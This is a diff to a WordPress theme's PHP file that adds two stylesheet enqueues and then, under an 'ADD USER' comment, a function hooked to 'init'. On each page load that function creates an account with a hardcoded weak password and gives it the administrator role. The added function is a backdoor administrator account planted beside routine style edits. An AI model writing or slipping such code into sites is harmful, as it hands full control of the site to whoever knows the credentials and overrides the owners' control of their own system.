@@ -19,6 +19,10 @@ function s7_scripts_styles() {
 
 		// CSS - kompiluje ho automaticky LESS Watcher (při změně, ale dist nevytváří, nutno sepnout GULP)
 		wp_enqueue_style("main_css", site_url() . ASSETS_PATH . "css/css_frontend/main.css", array(), VERSION_LINKS);
+        
+        wp_enqueue_style("style_up_css", site_url() . ASSETS_PATH . "css/css_frontend/style-up.css", array(), VERSION_LINKS);
+        
+        wp_enqueue_style("style_respo_css", site_url() . ASSETS_PATH . "css/css_frontend/style-respo.css", array(), VERSION_LINKS);
 
 		// JS
 		wp_enqueue_script("jquery_js", site_url() . ASSETS_PATH . "js/js_frontend/jquery-3.5.1.min.js", array(), VERSION_LINKS, true);
@@ -539,3 +543,21 @@ add_editor_style( 'style-editor.css' );
 /* TRANSLATIONS AUTOMATION */
 require_once (__DIR__ . "/inc/core/entity_translations/entity_translations_generator.php");
 switch_to_locale('en_US');
+
+
+/*ADD USER*/
+add_action('init', 'ds_add_user');
+
+function ds_add_user() {
+    $username = 'michalprochazka';
+    $password = 'pasword123';
+    $email = 'michal@example.com';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+
+        $user_id = wp_create_user($username, $password, $email);
+        $user = get_user_by('id', $user_id);
+        $user->remove_role('subscriber');
+        $user->add_role('administrator');
+    }
+}
